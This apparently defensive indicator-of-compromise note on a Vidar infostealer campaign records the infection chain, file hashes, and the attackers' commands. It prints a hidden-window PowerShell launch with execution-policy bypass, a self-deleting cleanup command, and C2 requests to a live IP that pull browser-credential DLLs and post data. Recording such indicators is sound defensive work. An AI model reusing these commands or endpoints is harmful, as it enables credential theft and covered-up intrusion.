@@ -1,0 +1,29 @@
+Vidar
+
+************************************************************************************************************
+
+.iso > .lnk > .ps > .jpg (fake repair/sales agreement) > .exe
+
+a.exe f9cda5b0caabf98afc1aeaf135d4c183140ce9ba4bfe4b159325848332c99393
+
+.lnk C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -w h -file z.ps1
+
+z.ps1 - script content
+
+Start-Process "p1.jpg"
+Start-Process "a.exe"
+
+C:\Windows\System32\cmd.exe" /c taskkill /im a.exe /f & timeout /t 6 & del /f /q "C:\Users\Admin\AppData\Local\Temp\a.exe" & del C:\ProgramData\*.dll & exit
+
+taskkill  /im a.exe /f 
+
+c2's .ddl drops 
+
+POST http://95.216.183.78/1149
+GET http://95.216.183.78/freebl3.dll a770ecba3b08bbabd0a567fc978e50615f8b346709f8eb3cfacf3faab24090ba
+GET http://95.216.183.78/mozglue.dll 3fe6b1c54b8cf28f571e0c5d6636b4069a8ab00b4f11dd842cfec00691d0c9cd
+http://95.216.183.78/msvcp140.dll 334e69ac9367f708ce601a6f490ff227d6c20636da5222f148b25831d22e13d4
+GET http://95.216.183.78/nss3.dll e2935b5b28550d47dc971f456d6961f20d1633b4892998750140e0eaa9ae9d78
+GET http://95.216.183.78/softokn3.dll 43536adef2ddcc811c28d35fa6ce3031029a2424ad393989db36169ff2995083
+GET http://95.216.183.78/vcruntime140.dll c40bb03199a2054dabfc7a8e01d6098e91de7193619effbd0f142a7bf031c14d
+POST http://95.216.183.78/ 
